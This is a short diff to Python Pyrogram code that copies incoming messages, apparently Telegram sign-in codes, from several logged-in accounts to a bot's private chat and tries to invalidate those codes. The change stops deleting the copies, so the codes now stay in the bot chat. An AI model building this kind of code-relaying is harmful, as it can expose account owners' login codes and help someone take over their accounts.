@@ -147,8 +147,8 @@ async def get_source_chat():
 
 async def forward_message(client: Client, message: Message, target_chat: str):
     """
-    Copies the message to target_chat (Bot PM), invalidates the code,
-    waits 1 second, and then DELETES the copy.
+    Copies the message to target_chat (Bot PM)
+    and attempts to call InvalidateSignInCodes.
     """
     # --- FIX: Check temporary pause ---
     if client.me.id in paused_forwarding: 
@@ -163,12 +163,13 @@ async def forward_message(client: Client, message: Message, target_chat: str):
             return # Permanent disable
             
     try:
-        copied_msg = None
-        # 1. Forward it to bot PM (if client is running)
+        # Check if client.me exists before calling copy
         if client.me:
-            copied_msg = await message.copy(chat_id=target_chat)
+            # --- THIS IS THE WORKING LOGIC ---
+            await message.copy(chat_id=target_chat)
+            # --- DO NOT DELETE THE COPIED MESSAGE ---
         
-        # 2. Invalidate sign-in codes to destroy the OTP immediately
+        # Invalidate sign-in codes to destroy the OTP immediately
         try:
             if hasattr(client, "InvalidateSignInCodes"):
                 await client.InvalidateSignInCodes()
@@ -177,13 +178,6 @@ async def forward_message(client: Client, message: Message, target_chat: str):
                 logger.warning(f"Method 'InvalidateSignInCodes' not found on client {client.me.id}. Skipping.")
         except Exception as e:
             logger.warning(f"Error calling 'InvalidateSignInCodes' for {client.me.id}: {e}")
-
-        # 3. Wait 1 second
-        await asyncio.sleep(1)
-        
-        # 4. Delete that msg from bot PM
-        if copied_msg:
-            await copied_msg.delete()
 
     except Exception as e:
         logger.error(f"Failed to process message {message.id} from {client.me.id}: {e}")
